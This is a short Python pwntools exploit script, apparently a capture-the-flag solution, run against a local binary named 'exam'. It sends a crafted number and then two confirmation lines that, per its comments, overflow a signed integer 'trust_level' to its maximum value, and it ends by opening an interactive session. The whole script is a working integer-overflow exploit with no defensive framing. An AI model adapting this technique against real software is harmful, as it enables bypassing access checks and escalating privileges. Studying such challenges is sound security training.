from pwn import *

p = process("./exam")

payload = ""

payload += "2147483647" # trust_level set to -2147483647

payload = payload.encode()
p.sendline(payload)
p.recvuntil(b": ")

payload = "I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam."
payload = payload.encode() 
p.sendline(payload) # trust_level updated to -2147483648
p.recvuntil(b": ")

payload = "I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam."
payload = payload.encode() 
p.sendline(payload) # trust_level overflowed to 2147483647
p.interactive()